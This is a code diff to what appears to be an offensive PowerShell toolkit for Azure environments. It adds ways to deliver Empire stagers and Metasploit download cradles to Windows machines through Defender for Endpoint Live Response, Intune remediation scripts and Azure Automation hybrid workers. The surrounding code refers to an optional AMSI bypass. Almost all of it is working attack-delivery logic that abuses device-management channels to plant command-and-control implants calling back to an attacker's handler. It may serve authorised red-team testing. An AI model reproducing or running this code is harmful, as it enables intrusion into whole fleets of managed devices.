@@ -563,6 +563,89 @@ function Invoke-EmpireExecution {
             }
         }
 
+        # If no targets found via Azure resources and DeviceName specified, try MDE/Intune/Automation
+        if ($targets.Count -eq 0 -and $DeviceName) {
+            $targetDevice = $DeviceName
+
+            # Try MDE if specified or auto mode (Windows only - PowerShell payloads)
+            if ($ExecMethod -in @("mde", "auto")) {
+                Write-ColorOutput -Message "[*] Trying MDE Live Response for device: $targetDevice" -Color "Yellow"
+
+                $mdeToken = Get-MDEAccessToken
+                if ($mdeToken) {
+                    $mdeDevice = Get-MDEDevice -DeviceName $targetDevice -AccessToken $mdeToken
+                    if ($mdeDevice -and $mdeDevice.osPlatform -eq "Windows") {
+                        Write-ColorOutput -Message "[+] Windows device found in MDE: $($mdeDevice.computerDnsName)" -Color "Green"
+                        $targets += [PSCustomObject]@{
+                            Name = $mdeDevice.computerDnsName
+                            ResourceGroup = "MDE"
+                            Type = "MDEDevice"
+                            OSType = $mdeDevice.osPlatform
+                            PowerState = $mdeDevice.healthStatus
+                            Location = "MDE"
+                            Method = "mde"
+                            Subscription = "MDE"
+                            SubscriptionId = $mdeDevice.id
+                            MDEMachineId = $mdeDevice.id
+                            MDEToken = $mdeToken
+                        }
+                    } elseif ($mdeDevice) {
+                        Write-ColorOutput -Message "[!] Device found in MDE but is not Windows ($($mdeDevice.osPlatform)) - Empire requires Windows" -Color "Yellow"
+                    } elseif ($ExecMethod -eq "mde") {
+                        Write-ColorOutput -Message "[!] Device not found in MDE" -Color "Yellow"
+                    }
+                } elseif ($ExecMethod -eq "mde") {
+                    Write-ColorOutput -Message "[!] Could not acquire MDE access token" -Color "Red"
+                }
+            }
+
+            # Try Intune if specified or auto mode (and still no targets) - Windows only
+            if ($targets.Count -eq 0 -and ($ExecMethod -in @("intune", "auto"))) {
+                Write-ColorOutput -Message "[*] Trying Intune for device: $targetDevice" -Color "Yellow"
+
+                $graphContext = Get-MgContext -ErrorAction SilentlyContinue
+                if (-not $graphContext) {
+                    try {
+                        if (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication) {
+                            Import-Module Microsoft.Graph.Authentication -ErrorAction SilentlyContinue
+                            Import-Module Microsoft.Graph.DeviceManagement -ErrorAction SilentlyContinue
+                            Connect-MgGraph -Scopes "DeviceManagementManagedDevices.PrivilegedOperations.All" -NoWelcome -ErrorAction Stop
+                            $graphContext = Get-MgContext -ErrorAction SilentlyContinue
+                        }
+                    } catch {
+                        if ($ExecMethod -eq "intune") {
+                            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph: $($_.Exception.Message)" -Color "Red"
+                        }
+                    }
+                }
+
+                if ($graphContext) {
+                    $intuneDevice = Get-IntuneDevice -DeviceName $targetDevice
+                    if ($intuneDevice -and $intuneDevice.operatingSystem -eq "Windows") {
+                        Write-ColorOutput -Message "[+] Windows device found in Intune: $($intuneDevice.deviceName)" -Color "Green"
+                        $targets += [PSCustomObject]@{
+                            Name = $intuneDevice.deviceName
+                            ResourceGroup = "Intune"
+                            Type = "IntuneDevice"
+                            OSType = $intuneDevice.operatingSystem
+                            PowerState = $intuneDevice.complianceState
+                            Location = "Intune"
+                            Method = "intune"
+                            Subscription = "Intune"
+                            SubscriptionId = $intuneDevice.id
+                            IntuneDeviceId = $intuneDevice.id
+                        }
+                    } elseif ($intuneDevice) {
+                        Write-ColorOutput -Message "[!] Device found in Intune but is not Windows ($($intuneDevice.operatingSystem)) - Empire requires Windows" -Color "Yellow"
+                    } elseif ($ExecMethod -eq "intune") {
+                        Write-ColorOutput -Message "[!] Device not found in Intune" -Color "Yellow"
+                    }
+                } elseif ($ExecMethod -eq "intune") {
+                    Write-ColorOutput -Message "[*] Microsoft.Graph module required for Intune execution" -Color "Gray"
+                }
+            }
+        }
+
         if ($targets.Count -eq 0) {
             continue
         }
@@ -578,6 +661,24 @@ function Invoke-EmpireExecution {
             Write-ColorOutput -Message "`n[*] Target: $targetName" -Color "White"
             Write-ColorOutput -Message "    Resource Group: $targetRG" -Color "Gray"
             Write-ColorOutput -Message "    OS: $targetOS | Method: $targetMethod" -Color "Gray"
+
+            # Validate Windows-only for Empire (PowerShell-based payloads)
+            if ($targetOS -ne "Windows") {
+                Write-ColorOutput -Message "    [!] Skipping non-Windows target - Empire requires Windows/PowerShell" -Color "Yellow"
+                $failedExec++
+                $exportData += [PSCustomObject]@{
+                    Subscription = $target.Subscription
+                    TargetName = $targetName
+                    ResourceGroup = $targetRG
+                    OSType = $targetOS
+                    Method = $targetMethod
+                    Listener = $Listener
+                    Status = "Skipped"
+                    Error = "Non-Windows target - Empire requires Windows"
+                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+                }
+                continue
+            }
 
             # Prepare command with optional AMSI bypass
             $commandToExecute = $stager
@@ -615,6 +716,55 @@ function Invoke-EmpireExecution {
                         -MachineName $targetName `
                         -RunCommandName $runCommandName `
                         -ErrorAction SilentlyContinue
+
+                } elseif ($targetMethod -eq "mde") {
+                    # MDE Live Response execution
+                    Write-ColorOutput -Message "    [*] Using MDE Live Response..." -Color "Cyan"
+
+                    $mdeResult = Invoke-MDELiveResponse `
+                        -MachineId $target.MDEMachineId `
+                        -Command $commandToExecute `
+                        -AccessToken $target.MDEToken `
+                        -Timeout $Timeout
+
+                    if ($mdeResult.Status -ne "Success") {
+                        throw "MDE Live Response failed: $($mdeResult.Output)"
+                    }
+
+                } elseif ($targetMethod -eq "intune") {
+                    # Intune Proactive Remediation execution
+                    Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation..." -Color "Cyan"
+
+                    $intuneResult = Invoke-IntuneRemediation `
+                        -DeviceId $target.IntuneDeviceId `
+                        -Command $commandToExecute `
+                        -PowerShell:$true `
+                        -DeviceName $targetName
+
+                    if ($intuneResult.Status -ne "Triggered") {
+                        throw "Intune Remediation failed: $($intuneResult.Output)"
+                    }
+                    Write-ColorOutput -Message "    [*] Intune execution is asynchronous - check Intune portal for results" -Color "Yellow"
+
+                } elseif ($targetMethod -eq "automation") {
+                    # Azure Automation Hybrid Worker execution
+                    Write-ColorOutput -Message "    [*] Using Azure Automation Hybrid Worker..." -Color "Cyan"
+
+                    if (-not $target.AutomationAccount -or -not $target.AutomationRG) {
+                        throw "Azure Automation requires -AutomationAccount and -AutomationRG parameters"
+                    }
+
+                    $automationResult = Invoke-AutomationExecution `
+                        -Command $commandToExecute `
+                        -AutomationAccountName $target.AutomationAccount `
+                        -ResourceGroupName $target.AutomationRG `
+                        -HybridWorkerGroup $target.HybridWorkerGroup `
+                        -PowerShell:$true `
+                        -Timeout $Timeout
+
+                    if ($automationResult.Status -ne "Success") {
+                        throw "Automation execution failed: $($automationResult.Output)"
+                    }
                 }
 
                 $duration = ((Get-Date) - $startTime).TotalSeconds
@@ -922,6 +1072,89 @@ function Invoke-MetasploitInjection {
             }
         }
 
+        # If no targets found via Azure resources and DeviceName specified, try MDE/Intune/Automation
+        if ($targets.Count -eq 0 -and $DeviceName) {
+            $targetDevice = $DeviceName
+
+            # Try MDE if specified or auto mode (Windows only - PowerShell payloads)
+            if ($ExecMethod -in @("mde", "auto")) {
+                Write-ColorOutput -Message "[*] Trying MDE Live Response for device: $targetDevice" -Color "Yellow"
+
+                $mdeToken = Get-MDEAccessToken
+                if ($mdeToken) {
+                    $mdeDevice = Get-MDEDevice -DeviceName $targetDevice -AccessToken $mdeToken
+                    if ($mdeDevice -and $mdeDevice.osPlatform -eq "Windows") {
+                        Write-ColorOutput -Message "[+] Windows device found in MDE: $($mdeDevice.computerDnsName)" -Color "Green"
+                        $targets += [PSCustomObject]@{
+                            Name = $mdeDevice.computerDnsName
+                            ResourceGroup = "MDE"
+                            Type = "MDEDevice"
+                            OSType = $mdeDevice.osPlatform
+                            PowerState = $mdeDevice.healthStatus
+                            Location = "MDE"
+                            Method = "mde"
+                            Subscription = "MDE"
+                            SubscriptionId = $mdeDevice.id
+                            MDEMachineId = $mdeDevice.id
+                            MDEToken = $mdeToken
+                        }
+                    } elseif ($mdeDevice) {
+                        Write-ColorOutput -Message "[!] Device found in MDE but is not Windows ($($mdeDevice.osPlatform)) - Metasploit PowerShell payloads require Windows" -Color "Yellow"
+                    } elseif ($ExecMethod -eq "mde") {
+                        Write-ColorOutput -Message "[!] Device not found in MDE" -Color "Yellow"
+                    }
+                } elseif ($ExecMethod -eq "mde") {
+                    Write-ColorOutput -Message "[!] Could not acquire MDE access token" -Color "Red"
+                }
+            }
+
+            # Try Intune if specified or auto mode (and still no targets) - Windows only
+            if ($targets.Count -eq 0 -and ($ExecMethod -in @("intune", "auto"))) {
+                Write-ColorOutput -Message "[*] Trying Intune for device: $targetDevice" -Color "Yellow"
+
+                $graphContext = Get-MgContext -ErrorAction SilentlyContinue
+                if (-not $graphContext) {
+                    try {
+                        if (Get-Module -ListAvailable -Name Microsoft.Graph.Authentication) {
+                            Import-Module Microsoft.Graph.Authentication -ErrorAction SilentlyContinue
+                            Import-Module Microsoft.Graph.DeviceManagement -ErrorAction SilentlyContinue
+                            Connect-MgGraph -Scopes "DeviceManagementManagedDevices.PrivilegedOperations.All" -NoWelcome -ErrorAction Stop
+                            $graphContext = Get-MgContext -ErrorAction SilentlyContinue
+                        }
+                    } catch {
+                        if ($ExecMethod -eq "intune") {
+                            Write-ColorOutput -Message "[!] Could not connect to Microsoft Graph: $($_.Exception.Message)" -Color "Red"
+                        }
+                    }
+                }
+
+                if ($graphContext) {
+                    $intuneDevice = Get-IntuneDevice -DeviceName $targetDevice
+                    if ($intuneDevice -and $intuneDevice.operatingSystem -eq "Windows") {
+                        Write-ColorOutput -Message "[+] Windows device found in Intune: $($intuneDevice.deviceName)" -Color "Green"
+                        $targets += [PSCustomObject]@{
+                            Name = $intuneDevice.deviceName
+                            ResourceGroup = "Intune"
+                            Type = "IntuneDevice"
+                            OSType = $intuneDevice.operatingSystem
+                            PowerState = $intuneDevice.complianceState
+                            Location = "Intune"
+                            Method = "intune"
+                            Subscription = "Intune"
+                            SubscriptionId = $intuneDevice.id
+                            IntuneDeviceId = $intuneDevice.id
+                        }
+                    } elseif ($intuneDevice) {
+                        Write-ColorOutput -Message "[!] Device found in Intune but is not Windows ($($intuneDevice.operatingSystem)) - Metasploit PowerShell payloads require Windows" -Color "Yellow"
+                    } elseif ($ExecMethod -eq "intune") {
+                        Write-ColorOutput -Message "[!] Device not found in Intune" -Color "Yellow"
+                    }
+                } elseif ($ExecMethod -eq "intune") {
+                    Write-ColorOutput -Message "[*] Microsoft.Graph module required for Intune execution" -Color "Gray"
+                }
+            }
+        }
+
         if ($targets.Count -eq 0) {
             continue
         }
@@ -937,6 +1170,25 @@ function Invoke-MetasploitInjection {
             Write-ColorOutput -Message "`n[*] Target: $targetName" -Color "White"
             Write-ColorOutput -Message "    Resource Group: $targetRG" -Color "Gray"
             Write-ColorOutput -Message "    OS: $targetOS | Method: $targetMethod" -Color "Gray"
+
+            # Validate Windows-only for Metasploit PowerShell payloads
+            if ($targetOS -ne "Windows") {
+                Write-ColorOutput -Message "    [!] Skipping non-Windows target - Metasploit PowerShell payloads require Windows" -Color "Yellow"
+                $failedExec++
+                $exportData += [PSCustomObject]@{
+                    Subscription = $target.Subscription
+                    TargetName = $targetName
+                    ResourceGroup = $targetRG
+                    OSType = $targetOS
+                    Method = $targetMethod
+                    Handler = "${SRVHOST}:${SRVPORT}"
+                    RAND = $RAND
+                    Status = "Skipped"
+                    Error = "Non-Windows target - Metasploit PowerShell payloads require Windows"
+                    Timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
+                }
+                continue
+            }
 
             # Prepare command with optional AMSI bypass
             $commandToExecute = $cradle
@@ -974,6 +1226,55 @@ function Invoke-MetasploitInjection {
                         -MachineName $targetName `
                         -RunCommandName $runCommandName `
                         -ErrorAction SilentlyContinue
+
+                } elseif ($targetMethod -eq "mde") {
+                    # MDE Live Response execution
+                    Write-ColorOutput -Message "    [*] Using MDE Live Response..." -Color "Cyan"
+
+                    $mdeResult = Invoke-MDELiveResponse `
+                        -MachineId $target.MDEMachineId `
+                        -Command $commandToExecute `
+                        -AccessToken $target.MDEToken `
+                        -Timeout $Timeout
+
+                    if ($mdeResult.Status -ne "Success") {
+                        throw "MDE Live Response failed: $($mdeResult.Output)"
+                    }
+
+                } elseif ($targetMethod -eq "intune") {
+                    # Intune Proactive Remediation execution
+                    Write-ColorOutput -Message "    [*] Using Intune Proactive Remediation..." -Color "Cyan"
+
+                    $intuneResult = Invoke-IntuneRemediation `
+                        -DeviceId $target.IntuneDeviceId `
+                        -Command $commandToExecute `
+                        -PowerShell:$true `
+                        -DeviceName $targetName
+
+                    if ($intuneResult.Status -ne "Triggered") {
+                        throw "Intune Remediation failed: $($intuneResult.Output)"
+                    }
+                    Write-ColorOutput -Message "    [*] Intune execution is asynchronous - check Intune portal for results" -Color "Yellow"
+
+                } elseif ($targetMethod -eq "automation") {
+                    # Azure Automation Hybrid Worker execution
+                    Write-ColorOutput -Message "    [*] Using Azure Automation Hybrid Worker..." -Color "Cyan"
+
+                    if (-not $target.AutomationAccount -or -not $target.AutomationRG) {
+                        throw "Azure Automation requires -AutomationAccount and -AutomationRG parameters"
+                    }
+
+                    $automationResult = Invoke-AutomationExecution `
+                        -Command $commandToExecute `
+                        -AutomationAccountName $target.AutomationAccount `
+                        -ResourceGroupName $target.AutomationRG `
+                        -HybridWorkerGroup $target.HybridWorkerGroup `
+                        -PowerShell:$true `
+                        -Timeout $Timeout
+
+                    if ($automationResult.Status -ne "Success") {
+                        throw "Automation execution failed: $($automationResult.Output)"
+                    }
                 }
 
                 $duration = ((Get-Date) - $startTime).TotalSeconds
